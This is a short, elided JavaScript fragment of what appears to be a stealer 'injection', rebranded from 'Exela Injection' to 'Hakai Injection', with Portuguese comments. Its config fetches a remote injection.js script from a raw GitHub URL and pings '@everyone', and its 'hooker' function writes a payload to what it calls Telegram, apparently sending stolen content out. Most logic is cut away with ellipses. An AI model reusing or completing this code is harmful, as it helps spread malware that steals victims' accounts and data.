...
const config = {
  ...
  ping_on_run: true,
  ping_val: '@everyone',
  embed_name: 'Hakai Injection', // Alterado de 'Exela Injection'
  embed_icon: 'https://i.hizliresim.com/6t31tw2.jpg',
  embed_color: 0,
  injection_url: 'https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js', // Removido o link do GitHub do Exela, substitua pelo correto
...
const hooker = async (content) => {
  ...
  req.on('error', (err) => {
    console.log('Erro ao enviar para Telegram:', err);
  });
  req.write(payload);
  req.end();
};
